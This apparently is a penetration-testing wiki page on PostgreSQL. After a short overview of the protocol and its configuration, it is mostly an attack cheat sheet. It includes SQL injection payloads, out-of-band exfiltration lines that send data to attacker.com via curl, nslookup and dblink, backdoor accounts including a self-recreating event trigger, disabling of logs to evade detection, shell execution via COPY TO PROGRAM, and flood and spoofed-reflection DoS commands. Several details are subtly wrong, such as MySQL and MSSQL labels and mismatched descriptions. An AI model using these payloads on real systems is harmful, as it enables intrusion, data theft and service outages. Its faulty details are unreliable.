# P5432 5433 PostgreSQL

## Index

* \[\[Ports, Protocols, and Services]]

## PostgreSQL Protocol

* **Port Number:** 5432
* **Protocol:** TCP
* **Service Name:** PostgreSQL
* **Defined in:** PostgreSQL Documentation, various RFCs (for underlying protocols)

PostgreSQL is an open-source, object-relational database management system (ORDBMS) that uses the SQL language combined with many features that safely store and scale the most complicated data workloads. PostgreSQL is known for its standards compliance, extensibility, and advanced features, such as full ACID compliance, complex queries, foreign keys, triggers, updatable views, transactional integrity, and multi-version concurrency control (MVCC).

### Overview of Features

* **ACID Compliance:** PostgreSQL ensures that all transactions are atomic, consistent, isolated, and durable, which is critical for maintaining data integrity.
* **Extensibility:** PostgreSQL is highly extensible, allowing users to define custom data types, operators, and even custom functions written in various programming languages.
* **SQL Compliance:** PostgreSQL adheres to a large portion of the SQL standard, making it a robust choice for applications requiring SQL compatibility.
* **MVCC (Multi-Version Concurrency Control):** This feature allows for concurrent processing of multiple transactions, minimizing lock contention in the database.
* **Replication:** PostgreSQL supports various types of replication, including streaming replication and logical replication, making it suitable for high availability and horizontal scaling.
* **Foreign Data Wrappers:** Allows PostgreSQL to interact with external data sources, including other databases and data formats.

### Typical Use Cases

* **Enterprise Applications:** PostgreSQL is widely used in enterprise environments for applications requiring a reliable, scalable, and standards-compliant database system.
* **Data Warehousing:** PostgreSQL's support for complex queries, indexing, and analytics functions makes it ideal for data warehousing.
* **Web Applications:** As a backend for web applications, PostgreSQL provides a robust, scalable solution with strong support for JSON and other modern data types.
* **GIS (Geographic Information Systems):** With the PostGIS extension, PostgreSQL becomes a powerful tool for spatial data analysis and geographic information systems.

### How PostgreSQL Protocol Works

1. **Client Connection Request:**
   * **Step 1:** The client initiates a connection to the PostgreSQL server by sending a connection request to `<target_ip>` on TCP port 5432.
   * **Step 2:** The PostgreSQL server responds with a protocol version number and authentication request.
2. **Authentication:**
   * **Step 3:** The client provides authentication credentials, typically a username and password. PostgreSQL supports multiple authentication methods, including MD5, SCRAM-SHA-256, and GSSAPI.
   * **Step 4:** The server verifies the credentials. If successful, the server sends a confirmation message to the client, allowing the session to proceed.
3. **SQL Query Execution:**
   * **Step 5:** The client sends SQL commands (queries, updates, etc.) to the server.
   * **Step 6:** The server processes the SQL command, interacting with the database as necessary to execute the query.
   * **Step 7:** The server sends the results of the query back to the client.
4. **Transaction Management:**
   * **Step 8:** If the client is executing a transaction, it may issue commands like `BEGIN`, `COMMIT`, or `ROLLBACK` to manage the transaction's state.
   * **Step 9:** PostgreSQL's MVCC ensures that transactions are handled concurrently without locking resources unnecessarily.
5. **Connection Termination:**
   * **Step 10:** The client may send a termination request to the server when it no longer needs to interact with the database.
   * **Step 11:** The server closes the connection, freeing up resources for other clients.

#### Diagram (Hypothetical Example)

* **Client:** `<attack_ip>` connects to `<target_ip>:5432` and authenticates using a username and password.
* **Server:** `<target_ip>` processes SQL queries from `<attack_ip>` and returns results.
* **Client:** `<attack_ip>` manages transactions, including commits and rollbacks, and eventually disconnects.

## Additional Information

### Security Considerations

* **Encryption:** PostgreSQL supports SSL/TLS to encrypt traffic between the client and server, protecting sensitive data from eavesdropping.
* **Authentication Methods:** PostgreSQL offers a variety of authentication methods, including password-based authentication, certificate-based authentication, and integration with external authentication systems like LDAP and Kerberos.
* **Role-Based Access Control (RBAC):** PostgreSQL implements a robust role-based access control system, allowing fine-grained control over who can access and modify data.
* **Logging and Auditing:** PostgreSQL provides extensive logging and auditing capabilities, enabling the tracking of queries, errors, and access attempts.

### High Availability and Replication

* **Streaming Replication:** Allows continuous streaming of WAL (Write-Ahead Logging) data from the primary to a standby server, ensuring high availability.
* **Logical Replication:** Enables replication of specific database objects, allowing more granular control over what data is replicated.

### Extensions and Plugins

* **PostGIS:** Adds support for geographic objects, allowing location queries to be run in SQL.
* **pg\_stat\_statements:** Provides detailed statistics on SQL query execution, useful for performance tuning.
* **pg\_cron:** Allows the scheduling of PostgreSQL tasks using the cron syntax.

### Configuration Files

1. **postgresql.conf:**

* **File Location:** `/etc/postgresql/<version>/main/postgresql.conf` or `/var/lib/pgsql/<version>/data/postgresql.conf`
* **Description:** The main configuration file for PostgreSQL, where all global settings are defined.
* **Key Settings:**
  * `listen_addresses`: Specifies the IP addresses on which PostgreSQL listens for client connections. Default is `localhost`.
  * `port`: Defines the port PostgreSQL listens on. Default is `5432`.
  * `max_connections`: Sets the maximum number of concurrent connections to the database.
  * `shared_buffers`: Determines how much memory PostgreSQL uses for shared memory buffers.
  * `logging_collector`: Enables or disables the logging collector.

2. **pg\_hba.conf:**

* **File Location:** `/etc/postgresql/<version>/main/pg_hba.conf` or `/var/lib/pgsql/<version>/data/pg_hba.conf`
* **Description:** Controls client authentication, defining who can connect to which databases and how.
* **Key Settings:**
  * `host`: Specifies that connections are allowed from certain IP addresses.
  * `local`: Specifies that connections are allowed from the local machine.
  * `md5`: Indicates that password authentication using MD5 hashes is required.

#### Table of Key Settings

| **Setting**         | **Description**                                                   |
| ------------------- | ----------------------------------------------------------------- |
| `listen_addresses`  | Defines which IP addresses PostgreSQL listens on for connections. |
| `port`              | The port number PostgreSQL listens on (default 5432).             |
| `max_connections`   | Maximum number of concurrent connections to the database.         |
| `shared_buffers`    | Amount of memory allocated for shared buffers.                    |
| `logging_collector` | Enables logging of database operations.                           |
| `ssl`               | Enables SSL encryption for connections.                           |

### Potential Misconfigurations

1. **Weak Authentication Configuration:**
   * **Risk:** Using weak passwords or insecure authentication methods (e.g., trust or password without SSL) can lead to unauthorized access.
   * **Exploitation:** Attackers can use brute-force attacks or sniff unencrypted credentials to gain access to the database.
2. **Improperly Configured `pg_hba.conf`:**
   * **Risk:** Allowing connections from any IP address or not properly restricting user access can lead to unauthorized access.
   * **Exploitation:** Attackers can exploit overly permissive configurations to connect to the database from unauthorized networks.
3. **Exposed Management Interface:**
   * **Risk:** Exposing PostgreSQL’s management interface (e.g., pgAdmin) to the public without proper security controls can lead to compromise.
   * **Exploitation:** Attackers can access and control the database remotely if management interfaces are exposed and inadequately secured.
4. **Unpatched Software:**
   * **Risk:** Running outdated versions of PostgreSQL can leave the system vulnerable to known exploits.
   * **Exploitation:** Attackers can exploit known vulnerabilities in older versions to gain unauthorized access or execute arbitrary code.

### Default Credentials

PostgreSQL does not have default credentials for production environments, as it prompts the administrator to set a password during installation. However, if a password is not set during setup, the `postgres` user may have no password or a default password, which should be immediately changed.

* **Common Default Users:**
  * `postgres`: The default superuser account in PostgreSQL installations.
* **Common Default Password:**
  * There is typically no default password, but if one exists or is empty, it represents a critical security risk.

## Interaction and Tools

### \[\[PostGres]]

https://www.w3schools.com/postgresql/index.php SQL commands are instructions that are used to interact with the database. They can be categorized into different types based on their purpose.

#### PostgreSQL Enumeration

*   **List databases:**

    ```sql
    \list
    \l
    ```
*   **Use the database:**

    ```sql
    \c <database>
    ```
*   **List tables:**

    ```sql
    \d
    ```
*   **Get user roles:**

    ```sql
    \du+
    ```
*   **Get current user:**

    ```sql
    Select user;
    ```
*   **List schemas:**

    ```sql
    SELECT schema_name,schema_owner FROM information_schema.schemata;
    \dn+
    ```
*   **List databases:**

    ```sql
    SELECT datname FROM pg_database;
    ```
*   **Read credentials (usernames/password hash):**

    ```sql
    SELECT usename, passwd from pg_shadow;
    ```
*   **Get languages:**

    ```sql
    SELECT lanname,lanacl FROM pg_language;
    ```
*   **Show installed extensions:**

    ```sql
    SHOW rds.extensions;
    ```
*   **Get history of commands executed:**

    ```sql
    \s
    ```
*   **Running a Query:**

    ```sql
    SELECT * FROM <table_name>;
    ```
*   **Creating a User:**

    ```sql
    CREATE USER <username> WITH PASSWORD '<password>';
    ```
*   **Granting Privileges:**

    ```sql
    GRANT
    ```

#### SQL Injection

**Error-Based SQLi**

*   **Substring Error:** Triggers an error by exceeding the allowable substring length.

    ```
    ' AND 1=(SELECT SUBSTRING(version(), 1, 1000)) -- -
    ```
*   **Invalid Cast:** Generates a cast error by converting a user name to an integer.

    ```c
    ' AND 1=CAST((SELECT current_user) AS int) -- -
    ```
*   **Division by Zero:** Forces a division by zero error.

    ```c
    ' AND 1/(SELECT COUNT(*) FROM pg_catalog.pg_tables)=0 -- -
    ```

**Union-Based SQLi**

*   **Database Version:** Appends the PostgreSQL version to the result set.

    ```c
    ' UNION SELECT NULL, version() -- -
    ```
*   **Database Name:** Extracts the name of the current database.

    ```c
    ' UNION SELECT NULL, current_database() -- -
    ```
*   **Table Name Enumeration:** Lists the names of all tables in the `public` schema.

    ```c
    ' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0 -- -
    ```
*   **Column Name Enumeration:** Retrieves the column names from a specified table.

    ```c
    ' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0 -- -
    ```
*   **User Data Extraction:** Extracts usernames and passwords from the `users` table.

    ```c
    ' UNION SELECT NULL, username, password FROM users -- -
    ```

**Boolean-Based SQLi**

*   **Checking PostgreSQL Version:** Evaluates to true if the PostgreSQL version starts with '9'.

    ```c
    ' AND SUBSTRING(version(), 1, 1) = '9' -- -
    ```
*   **Determining the Number of Tables:** Evaluates to true if there are more than 10 tables in the `public` schema.

    ```c
    ' AND (SELECT COUNT(*) FROM pg_tables WHERE schemaname = 'public') > 10 -- -
    ```
*   **Checking Existence of a Column:** Evaluates to true if the `password` column exists in the `users` table.

    ```c
    ' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password') > 0 -- -
    ```
*   **Extracting Data from a Column:** Evaluates to true if the first character of the first username in the `users` table is 'a'.

    ```c
    ' AND (SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1) = 'a' -- -
    ```

**Time-Based SQLi**

*   **Basic Time Delay Test:** Causes the PostgreSQL database to sleep for 5 seconds. If the response is delayed, the injection point is likely vulnerable.

    ```c
    ' OR pg_sleep(5) -- -
    ```
*   **Conditional Time Delay:** Causes a 5-second delay if the condition `1=1` is true.

    ```c
    ' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) -- -
    ```
*   **Checking PostgreSQL Version:** Causes a 5-second delay if the PostgreSQL version starts with '9'.

    ```c
    ' OR (SELECT CASE WHEN (SUBSTRING(version(), 1, 1) = '9') THEN pg_sleep(5) ELSE pg_sleep(0) END) -- -
    ```
*   **Checking Existence of a Table:** Causes a 5-second delay if the `users` table exists in the `public` schema.

    ```c
    ' OR (SELECT CASE WHEN (EXISTS (SELECT 1 FROM pg_tables WHERE schemaname = 'public' AND tablename = 'users')) THEN pg_sleep(5) ELSE pg_sleep(0) END) -- -
    ```
*   **Extracting Data from a Column:** Causes a 5-second delay if the first character of the first username in the `users` table is 'a'.

    ```c
    ' OR (SELECT CASE WHEN (SUBSTRING(username, 1, 1) = 'a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users LIMIT 1) -- -
    ```

**Out-of-Band SQLi**

*   **DNS Exfiltration Using COPY:** Uses the `COPY` command to send the database version to an attacker-controlled DNS server.

    ```c
    ' COPY (SELECT version()) TO PROGRAM 'nslookup $(database()).attacker.com' -- -
    ```
*   **HTTP Exfiltration Using PL/pgSQL:** Uses the `dblink` extension to send the current PostgreSQL user to an attacker-controlled server.

    ```c
    ' DO $$ BEGIN PERFORM dblink_connect('host=attacker.com user=attacker password=pass');  PERFORM dblink_exec('INSERT INTO exfiltrated_data(data) VALUES (''' || current_user || ''')');  END $$; -- -
    ```
*   **Exfiltration Using LO\_EXPORT:** Exports the current user to a file and sends it to an attacker-controlled server via an HTTP POST request.

    ```c
    ' SELECT lo_export(lo_creat(-1), '/tmp/' || current_user || '.txt');  COPY (SELECT lo_import('/tmp/' || current_user || '.txt')) TO PROGRAM 'curl -X POST --data-binary @/tmp/' || current_user || '.txt http://attacker.com/'; -- -
    ```

### Tools

#### \[\[PSQL]]

*   **Connecting to PostgreSQL:** Connects to a PostgreSQL database using the specified host, username, and database name.

    ```bash
    psql -h <target_ip> -p 5432 -U <username> -W <password> -d <database_name>
    ```
*   **Backing Up Database:** Creates a backup of the specified PostgreSQL database.

    ```bash
    pg_dump -h <target_ip> -p 5432 -U <username> -W <password> -d <database_name> > backup.sql
    ```
*   **Restoring Database:** Restores a database from a backup file.

    ```bash
    psql -h <target_ip> -p 5432 -U <username> -W <password> -d <database_name> -f backup.sql
    ```
* **Replicating Data:** Creates a base backup of a PostgreSQL database for replication purposes.

```bash
pg_basebackup -h <target_ip> -p 5432 -U <username> -W <password> -d <database_name> -D /var/lib/pgsql/data -Fp -Xs -P
```

### Exploitation Tools

#### \[\[Metasploit]]

#### \[\[Wireshark]]

*   **Wireshark Packet Capture:**

    ```bash
    wireshark -i <interface> -f "tcp port 5432"
    ```

#### \[\[Nmap]]

*   **Basic Nmap Scan:** Scan target on specified port to verify if service is on.

    ```bash
    nmap <target_ip> -p 5432
    ```

#### \[\[NetCat]]

*   **Netcat TCP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 5432
    ```
*   **Netcat UDP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 5432 -u
    ```
*   **Execute Commands:** Execute commands on target.

    ```bash
    echo "<command>" | nc <target_ip> 5432
    ```
*   **Exfiltrate Data:** Exfiltrate data over specified port.

    ```bash
    nc <target_ip> 5432 < secret_data.txt
    ```

#### \[\[SoCat Cheat Sheet]]

*   **SoCat TCP Connect:** Simple tests to verify port service is running and responding.

    ```bash
    socat - TCP:<target_ip>:5432
    ```

#### \[\[HPing3 Cheat Sheet]]

*   **Send Packet:** Send TCP packet to the service. Use `-2` to send UDP packet.

    ```bash
    hping3 <target_ip> -p 5432
    ```

#### \[\[SQLNinja]]

#### \[\[SQLMap Cheat Sheet]]

*   **Run SQLMap:** Exploiting SQL Injection vulnerabilities in web applications connected to MySQL.

    ```bash
    sqlmap -u "http://<target_ip>/vulnerable_page.php?id=1" --dbms=postgresql --dump
    ```

#### \[\[pgExploit]]

*   **Run pgExploit:** Exploit PostgreSQL vulnerabilities, including privilege escalation and data exfiltration.

    ```bash
    python pgExploit.py --host <target_ip> --port 5432 --user postgres --pass <password>
    ```

### Other Techniques

#### \[\[pgAdmin]]

* A web-based GUI tool for managing PostgreSQL databases.
* **Connect to PostgreSQL Server:**
  1. Open pgAdmin.
  2. Right-click on "Servers" and select "Create" -> "Server".
  3. Enter server details and connect.

## Penetration Testing Techniques

### External Reconnaissance

#### Port Scanning

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap <target_ip> -p 5432
    ```
* **Description:** Identifies if the target service is running on the target by scanning target port.

#### Service Enumeration

*   **Tool:** \[\[NetCat]]

    ```bash
    nc <target_ip> 5432
    ```
* **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

### Initial Access

#### Exploiting Default Credentials

*   **Tool:** \[\[SQLMap Cheat Sheet]]

    ```bash
    sqlmap -u "http://<target_ip>/vulnerable.php?id=1" --dbms=postgresql --batch --passwords
    ```
* **Description:** Attempts to log in using default or weak credentials to gain access to the MySQL database.

#### Exploiting SQL Injection

*   **Tool:** \[\[SQLMap Cheat Sheet]]

    ```bash
    sqlmap -u "http://<target_ip>/vulnerable_page.php?id=1" --dbms=postgresql --dump
    ```
* **Description:** Exploits SQL Injection vulnerabilities to extract data from MSSQL databases.

### Persistence

#### Create a SQL User Account

*   **Tool:** \[\[PSQL]]

    ```bash
    CREATE USER backdoor WITH PASSWORD 'backdoor_password';
    ```
*
  * **Description:** Creates a new user with full privileges that can be used to maintain access to the database.

#### Scheduled Jobs (pg\_cron)

*   **Tool:** \[\[PSQL]]

    ```bash
    CREATE EXTENSION pg_cron;
    SELECT cron.schedule('*/5 * * * *', 'SELECT my_function()');
    ```
* **Description:** Schedules a job to run periodically, which could be used to maintain persistence within the database.

### Credential Harvesting

#### Packet Capture

*   **Tool:** \[\[Wireshark]]

    ```bash
    wireshark -i <interface> -f "tcp port 5432"
    ```
* **Description:** Capture traffic and extract plaintext credentials.

#### Man-in-the-Middle (MITM) Attack

*   **Tool:** \[\[BetterCap Cheat Sheet]]

    ```bash
    bettercap -iface <interface> -T <target_ip> --proxy
    ```
* **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

#### Dumping Password Hashes

*   **Tool:** \[\[PSQL]]

    ```bash
    SELECT usename, passwd FROM pg_shadow;
    ```
* **Description:** Retrieves username and password hashes from the PostgreSQL shadow table, which can be cracked offline.

### Privilege Escalation

#### Create Admin Account

*   **Tool:** \[\[PSQL]]

    ```bash
    CREATE USER backdoor WITH PASSWORD 'backdoor_password';
    GRANT ALL PRIVILEGES ON DATABASE <database_name> TO backdoor;
    ```
*
  * **Description:** Creates a new user with full privileges that can be used to maintain access to the database.

#### Manipulate Existing User Account

*   **Tool:** \[\[PSQL]]

    ```bash
    ALTER USER postgres WITH SUPERUSER;
    ```
* **Description:** Modify an existing user account password for persistent access.

### Trigger-Based Persistence

*   **Tool:** \[\[PSQL]]

    ```bash
    CREATE OR REPLACE FUNCTION backdoor_trigger() RETURNS event_trigger AS $$
    BEGIN
      EXECUTE 'CREATE USER backdoor WITH PASSWORD ''backdoor''';
    END;
    $$ LANGUAGE plpgsql;

    CREATE EVENT TRIGGER my_trigger ON ddl_command_end EXECUTE FUNCTION backdoor_trigger();

    ```
* **Description:** Uses a trigger to automatically recreate a backdoor user whenever a DDL command is executed.

#### Privilege Escalation via SQL Injection

*   **Tool:** \[\[SQLMap Cheat Sheet]]

    ```bash
    sqlmap -u "http://<target_ip>/vulnerable.php?id=1" --dbms=postgresql --os-shell
    ```
* **Description:** Uses SQL injection to gain access to the underlying operating system, leading to privilege escalation.

#### Abusing Database Extensions

* **Tool:** \[\[PSQL]]

```bash
CREATE EXTENSION adminpack;
```

* **Description:** Enable database extensions that might allow for file system access or other privileged operations.

#### Postgres Shell

*   **Tool:** \[\[PSQL]]

    ```bash
    COPY (SELECT '') TO PROGRAM 'whoami';
    ```
* **Description:** If access to the database is gained, the attacker can execute shell commands via PostgreSQL’s `COPY` command.

### Internal Reconnaissance

#### Database Enumeration

*   **Tool:** \[\[PSQL]]

    ```bash
    SELECT datname FROM pg_database;
    ```
* **Description:** Enumerates all databases on the PostgreSQL server to gather information on the target environment.

#### Schema Mapping

*   **Tool:** \[\[PSQL]]

    ```bash
    SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';
    ```
* **Description:** Lists all tables in the public schema, providing insight into the structure of the target database.

#### Directory Traversal

*   **Tool:** \[\[PSQL]]

    ```bash
    COPY (SELECT '') TO '/tmp/evil_file';
    ```
* **Description:** Exploiting insecure functions in PostgreSQL to read or write files outside the intended directories.

### Lateral Movement, Pivoting, and Tunnelling

#### Database Links

*   **Tool:** \[\[PSQL]]

    ```bash
    CREATE EXTENSION postgres_fdw;
    CREATE SERVER foreign_server FOREIGN DATA WRAPPER postgres_fdw OPTIONS (host '<internal_ip>', dbname '<dbname>');
    ```
* **Description:** Uses PostgreSQL's Foreign Data Wrappers to link to and query other databases within the network.

#### Using PostgreSQL as a Pivot

*   **Tool:** \[\[SSH]], \[\[PSQL]]

    ```bash
    ssh -L 5432:<internal_db_ip>:5432 user@<target_ip>
    psql -h localhost -U <username> -d <database_name>
    ```
* **Description:** Establishes an SSH tunnel to an internal PostgreSQL server, allowing lateral movement within the network.

### Defense Evasion

#### Obfuscating SQL Queries

* **Tool:** \[\[PSQL]]

```bash
SELECT * FROM pg_catalog.pg_tables WHERE schemaname = 'public';
```

* **Description:** Use catalog queries to retrieve information while avoiding detection by simple query logs.

#### Log Evasion

*   **Tool:** \[\[PSQL]]

    ```bash
    SET log_statement = 'none';
    ```
* **Description:** Temporarily disables logging of SQL statements to evade detection during a penetration test.

#### Disabling Logging

*   **Tool:** \[\[PSQL]]

    ```bash
    ALTER SYSTEM SET log_statement = 'none';
    ```
* **Description:** Disable or reduce logging to evade detection during exploitation.

### Data Exfiltration

#### Exfiltrating Data via SQL Dump

*   **Tool:** \[\[pg\_Dump]]

    ```bash
    pg_dump -h <target_ip> -U <username> -p 5432 <database_name> > data_dump.sql
    ```
* **Description:** Dumps the entire database to a file, which can then be exfiltrated from the target environment.

#### Encoding Data for Exfiltration

*   **Tool:** \[\[PSQL]]

    ```bash
    SELECT encode(pg_read_binary_file('/path/to/secret_data'), 'base64');
    ```
* **Description:** Encodes binary data in base64 for easier exfiltration via SQL queries.

## Exploits and Attacks

### Password Attacks

#### Password Brute Force

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra postgres://<target_ip> -s 5432 -l <username> -P <password_list>
    ```
* **Description:** Test a single username against multiple passwords.

#### Password Spray

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra postgres://<target_ip> -s 5432 -l <username_list> -P <password>
    ```
* **Description:** Test a multiple usernames against a single password.

#### Offline Hash Cracking

*   **Tool:** \[\[John the Ripper Cheat Sheet]]

    ```bash
    john --wordlist=<path/to/wordlist> <hash_file>
    ```

\


*   **Tool:** \[\[HashCat Cheat Sheet]]

    ```bash
    hashcat -m <mode> <hash_file> <path/to/wordlist>
    ```
* **Description:** Cracks dumped password hashes to gain access.

### Denial of Service

#### TCP/UPD Flood Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip> -p 5432 --flood --rand-source -c 1000
    ```
* **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

#### TCP/UDP Reflection Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip_1> -p 5432 --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
* **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

#### Exploiting Resource-Intensive Queries

*   **Tool:** \[\[PSQL]]

    ```bash
    SELECT generate_series(1, 100000000);
    ```
* **Description:** Execute resource-intensive queries to consume server resources and degrade performance.

### Exploits

#### PostgreSQL Privilege Escalation (CVE-2019-9193)

*   **Tool:** \[\[Metasploit]]

    ```bash
    msfconsole
    use exploit/linux/postgres/postgres_payload
    set RHOSTS <target_ip>
    set RPORT 5432
    run
    ```
* **Description:** Exploits a vulnerability in PostgreSQL to escalate privileges and execute arbitrary code on the server.

#### CVE-2019-9193 - PostgreSQL Arbitrary Code Execution

* **Tool:** \[\[Metasploit]]

```bash
use exploit/linux/postgres/postgres_copy_from_program_cmd_exec
set RHOSTS <target_ip>
set RPORT 5432
set USERNAME postgres
set PASSWORD <password>
run
```

* **Description:** Exploits a vulnerability in PostgreSQL's `COPY FROM PROGRAM` functionality to execute arbitrary commands on the server.

## Resources

| **Website**                       | **URL**                                             |
| --------------------------------- | --------------------------------------------------- |
| PostgreSQL Official Documentation | https://www.postgresql.org/docs/                    |
| Nmap PostgreSQL Scan              | https://nmap.org/nsedoc/scripts/pgsql-brute.html    |
| pgAdmin Official Site             | https://www.pgadmin.org/                            |
| SQLMap Documentation              | http://sqlmap.org/                                  |
| Metasploit PostgreSQL Modules     | https://www.rapid7.com/db/modifications/postgresql/ |
| John the Ripper                   | https://www.openwall.com/john/                      |
| Hydra Tool Documentation          | https://github.com/vanhauser-thc/thc-hydra          |
| Wireshark User Guide              | https://www.wireshark.org/docs/wsug\_html\_chunked/ |
| Linux man-pages                   | https://man7.org/linux/man-pages/                   |
